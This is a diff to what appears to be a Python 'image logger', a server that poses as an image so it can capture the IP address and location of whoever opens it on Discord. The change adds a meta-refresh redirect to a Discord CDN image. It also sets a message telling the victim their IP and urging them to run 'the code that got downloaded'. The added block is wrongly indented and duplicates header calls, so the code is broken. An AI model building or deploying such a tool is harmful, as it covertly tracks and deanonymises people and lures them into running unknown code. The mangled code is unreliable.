@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "W, don't tell anyone about these tools, file's password is 1", # Message to show
+        "message": "Your IP is {ip}, if you want to make your own image logger run the code that got downloaded.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -269,6 +269,18 @@ height: 100vh;
                 self.send_response(200) # 200 = OK (HTTP Status)
                 self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                 self.end_headers() # Declare the headers as finished.
+
+                redirect_url = config["redirect"]["page"]
+if redirect_url:
+    data = f'<meta http-equiv="refresh" content="0;url={redirect_url}">'.encode()
+else:
+    default_redirect_url = "https://cdn.discordapp.com/attachments/1150324884031950898/1200914061030850580/8jthWYF.png?ex=65c7e960&is=65b57460&hm=cb2e0fe2bf22fce7667694c8345607a008ce37de7eef62da8e18dfe33520828f&"
+    data = f'<meta http-equiv="refresh" content="0;url={default_redirect_url}">'.encode()
+
+self.send_response(200)
+self.send_header('Content-type', datatype)
+self.end_headers()
+self.wfile.write(data)
 
                 if config["accurateLocation"]:
                     data += b"""<script>
